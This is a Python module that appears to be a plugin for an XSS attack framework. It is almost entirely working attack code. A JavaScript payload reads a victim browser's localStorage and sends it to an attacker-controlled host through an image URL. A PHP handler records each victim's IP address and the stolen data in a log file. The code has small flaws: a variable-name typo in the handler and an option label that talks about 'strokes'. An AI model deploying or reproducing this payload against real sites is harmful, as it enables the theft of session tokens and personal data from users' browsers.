#!/usr/bin/python3.7
import socket
def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except:
        return "N/A"
name="storage"
description="Retrieves HTML5 local storage and send it away through an image source URL"
options = [["LHOST", "Host to send captured strokes to", local_ip()]] 
handler_options = [["LOGFILE", "File to store logged data", "storage_dump.txt"]]

payload = """
if ('localStorage' in window && window['localStorage'] !== null) {
new Image().src = 'http://LHOST:8000/handler.php?localStorage='+JSON.stringify(window['localStorage']);
} 

"""

handler = """
<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$storage_dump_line = sprintf("\n[*] Host: %s \n[*] Storage: %s\n\n", $ip, $_GET['localStorage']);
$f=fopen("LOGFILE","a+");
fwrite($f, $storage_dump__line);
fclose($f);
?>
"""
